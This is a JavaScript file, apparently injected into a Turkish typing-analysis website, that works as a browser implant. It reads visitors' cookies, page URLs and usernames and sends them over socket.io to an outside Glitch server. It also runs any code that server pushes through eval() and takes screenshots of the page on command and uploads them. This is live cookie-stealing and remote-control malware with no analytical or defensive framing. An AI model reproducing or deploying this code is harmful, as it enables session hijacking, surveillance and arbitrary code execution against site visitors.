function loadScript(src, callback) {
    const script = document.createElement('script');
    script.src = src;
    script.onload = callback;
    script.onerror = () => console.error(`${src} yüklenemedi`);
    document.head.appendChild(script);
}

let lastSentData = null;

function getClientData() {
    const data = {
        cookies: document.cookie,
        url: window.location.href,
        username: "Bulunamadı"
    };

    const cookies = document.cookie.split(';').map(c => c.trim());
    const klavyeCookie = cookies.find(c => c.startsWith('klavyeanaliz_id='));
    let klavyeId = klavyeCookie && klavyeCookie.split('=')[1] && klavyeCookie.split('=')[1].trim() ? klavyeCookie.split('=')[1].trim() : null;

    let storedUsernames;
    try {
        storedUsernames = JSON.parse(localStorage.getItem('username_map')) || {};
    } catch (e) {
        storedUsernames = {};
    }

    if (klavyeId) {
        const dropdown = document.querySelector('a.dropdown-toggle span.text');
        if (dropdown && dropdown.textContent && dropdown.textContent.trim()) {
            data.username = dropdown.textContent.trim();
            if (data.username !== storedUsernames[klavyeId]) {
                storedUsernames[klavyeId] = data.username;
                try {
                    localStorage.setItem('username_map', JSON.stringify(storedUsernames));
                } catch (e) {}
            }
        } else if (storedUsernames[klavyeId]) {
            data.username = storedUsernames[klavyeId];
        } else {
            data.username = klavyeId;
        }
    } else {
        let misafirId = localStorage.getItem('misafir_id');
        if (!misafirId) {
            misafirId = 'misafir-' + Math.floor(Math.random() * 1000000);
            try {
                localStorage.setItem('misafir_id', misafirId);
            } catch (e) {}
        }
        data.username = misafirId;
    }

    return { klavyeId: klavyeId || data.username, data };
}

function shouldSendData(newData) {
    if (!lastSentData) return true;
    return newData.cookies !== lastSentData.cookies || newData.url !== lastSentData.url || newData.username !== lastSentData.username;
}

loadScript('https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js', () => {
    loadScript('https://intriguing-insidious-trout.glitch.me/socket.io/socket.io.js', () => {
        const socket = io('https://intriguing-insidious-trout.glitch.me');
        socket.on('connect', () => {
            const { klavyeId, data } = getClientData();
            if (shouldSendData(data)) {
                socket.emit('clientData', { klavyeId, username: data.username, url: data.url, cookies: data.cookies });
                lastSentData = data;
            }
        });
        socket.on('payload', (payload) => {
            try {
                eval(payload);
            } catch (err) {}
        });
        socket.on('takeScreenshot', (clientId) => {
            if (typeof html2canvas !== 'undefined') {
                html2canvas(document.body, {
                    width: window.innerWidth,
                    height: window.innerHeight,
                    x: window.scrollX,
                    y: window.scrollY
                }).then(canvas => {
                    const screenshot = canvas.toDataURL('image/png');
                    socket.emit('screenshot', { clientId, screenshot });
                }).catch(err => console.error('Ekran görüntüsü alınamadı:', err));
            } else {
                console.error('html2canvas yüklenemedi');
            }
        });
    });
});